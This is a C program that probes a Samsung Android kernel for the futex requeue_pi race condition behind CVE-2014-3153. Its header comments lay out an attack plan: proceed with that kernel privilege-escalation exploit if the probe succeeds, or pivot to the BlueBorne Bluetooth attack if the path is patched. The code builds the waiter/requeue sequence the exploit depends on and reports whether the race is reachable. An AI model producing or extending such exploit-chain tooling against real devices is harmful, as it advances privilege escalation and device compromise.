/*
 * futex_probe.c — Targeted test of CMP_REQUEUE_PI + WAIT_REQUEUE_PI
 *
 * Tests whether FUTEX_CMP_REQUEUE_PI works on this Samsung kernel when:
 * 1. Using FUTEX_PRIVATE_FLAG (virtual-address-based hash, no inode issues)
 * 2. F1 and F2 on truly separate virtual pages (separate mmap calls)
 * 3. Victim is actually blocking (confirmed by timing)
 *
 * If rq==1: CMP_REQUEUE_PI works! Proceed with CVE-2014-3153.
 * If rq==-1/EINVAL: Samsung patched requeue_pi unconditionally. Pivot to BlueBorne.
 * If rq==0: CMP_REQUEUE_PI works but timing is off (victim not in queue yet).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <time.h>
#include <sched.h>
#include <linux/futex.h>
#include <stdatomic.h>
#include <limits.h>

#define FUTEX_PRIVATE_FLAG 128

static volatile int *f1_page;
static volatile int *f2_page;

#define F1 ((int*)f1_page)
#define F2 ((int*)f2_page)

static atomic_int g_victim_ready = ATOMIC_VAR_INIT(0);
static atomic_int g_go           = ATOMIC_VAR_INIT(0);

static inline long long ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

/* Victim: blocks on F1 via WAIT_REQUEUE_PI for 10 seconds */
static void *victim(void *arg) {
    (void)arg;
    cpu_set_t mask; CPU_ZERO(&mask); CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Wait for main to be ready */
    while (!atomic_load(&g_go)) __asm__ volatile("" ::: "memory");

    /* Signal we're about to enter futex */
    atomic_store(&g_victim_ready, 1);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 10; /* 10 second timeout */

    printf("[victim] calling WAIT_REQUEUE_PI(F1, 0, 10s, F2) with %s flag\n",
           (intptr_t)arg ? "PRIVATE" : "SHARED");
    fflush(stdout);

    int flags = (intptr_t)arg ? (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
                               : FUTEX_WAIT_REQUEUE_PI;
    int ret = syscall(SYS_futex, F1, flags, 0, &ts, F2, 0);
    int err = errno;

    printf("[victim] WAIT_REQUEUE_PI ret=%d errno=%d *F1=%d *F2=%d\n",
           ret, err, *F1, *F2);
    fflush(stdout);

    if (ret == 0) {
        /* We own F2, unlock it */
        int uflags = (intptr_t)arg ? (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
                                    : FUTEX_UNLOCK_PI;
        syscall(SYS_futex, F2, uflags, 0, NULL, NULL, 0);
    }

    return NULL;
}

static void test_cmp_requeue_pi(int use_private) {
    printf("\n=== Test: CMP_REQUEUE_PI %s ===\n", use_private ? "PRIVATE" : "SHARED");
    fflush(stdout);

    *F1 = 0;
    *F2 = 0;
    atomic_store(&g_victim_ready, 0);
    atomic_store(&g_go, 0);

    /* Main takes F2 first via LOCK_PI */
    int lflags = use_private ? (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) : FUTEX_LOCK_PI;
    int lr = syscall(SYS_futex, F2, lflags, 0, NULL, NULL, 0);
    printf("[main] LOCK_PI(F2): ret=%d errno=%d *F2=%d\n", lr, lr<0?errno:0, *F2);
    fflush(stdout);

    /* Start victim thread */
    pthread_t vtid;
    pthread_create(&vtid, NULL, victim, (void*)(intptr_t)use_private);

    /* Signal victim to go */
    atomic_store(&g_go, 1);

    /* Wait for victim to signal it's about to enter futex */
    while (!atomic_load(&g_victim_ready)) __asm__ volatile("" ::: "memory");

    /* Sleep 500ms — plenty of time for victim to be in the queue */
    struct timespec sl = {0, 500000000L}; /* 500ms */
    nanosleep(&sl, NULL);

    printf("[main] 500ms elapsed, firing CMP_REQUEUE_PI...\n");
    fflush(stdout);

    /* Fire CMP_REQUEUE_PI */
    int cflags = use_private ? (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
                              : FUTEX_CMP_REQUEUE_PI;
    long long t0 = ns_now();
    int rq = (int)syscall(SYS_futex, F1, cflags, 0,
                          (void *)(intptr_t)1, (void *)F2, 0);
    int rq_errno = errno;
    long long elapsed = (ns_now() - t0) / 1000LL;

    printf("[main] CMP_REQUEUE_PI: rq=%d errno=%d elapsed=%lldµs *F1=%d *F2=%d\n",
           rq, rq < 0 ? rq_errno : 0, elapsed, *F1, *F2);
    fflush(stdout);

    /* Unlock F2 */
    int uflags = use_private ? (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG) : FUTEX_UNLOCK_PI;
    int ur = syscall(SYS_futex, F2, uflags, 0, NULL, NULL, 0);
    printf("[main] UNLOCK_PI(F2): ret=%d errno=%d\n", ur, ur<0?errno:0);
    fflush(stdout);

    /* Wake F1 in case victim is still there */
    syscall(SYS_futex, F1, FUTEX_WAKE | (use_private ? FUTEX_PRIVATE_FLAG : 0),
            INT_MAX, NULL, NULL, 0);

    pthread_join(vtid, NULL);

    if (rq == 1) {
        printf("[+] SUCCESS: CMP_REQUEUE_PI moved victim to F2 queue!\n");
        printf("[+] CVE-2014-3153 race path IS available with %s flag.\n",
               use_private ? "PRIVATE" : "SHARED");
    } else if (rq == 0) {
        printf("[-] CMP_REQUEUE_PI returned 0 (no waiters found — timing issue?)\n");
    } else {
        printf("[-] CMP_REQUEUE_PI returned -1 errno=%d (%s)\n",
               rq_errno, strerror(rq_errno));
        if (rq_errno == EINVAL)
            printf("    EINVAL: Samsung may have patched requeue_pi entirely.\n");
    }
    fflush(stdout);
}

int main(void) {
    printf("=== futex_probe — CMP_REQUEUE_PI capability test ===\n");
    printf("[*] pid=%d uid=%d\n", getpid(), getuid());
    fflush(stdout);

    /* Two truly separate virtual pages via separate mmap calls */
    f1_page = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    f2_page = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (f1_page == MAP_FAILED || f2_page == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[*] F1=%p F2=%p (separate virtual pages, MAP_PRIVATE)\n",
           (void*)f1_page, (void*)f2_page);
    fflush(stdout);

    cpu_set_t mask; CPU_ZERO(&mask); CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Test 1: PRIVATE flag */
    test_cmp_requeue_pi(1);

    /* Reset futexes */
    *F1 = 0; *F2 = 0;

    /* Test 2: SHARED flag (no PRIVATE) */
    test_cmp_requeue_pi(0);

    return 0;
}
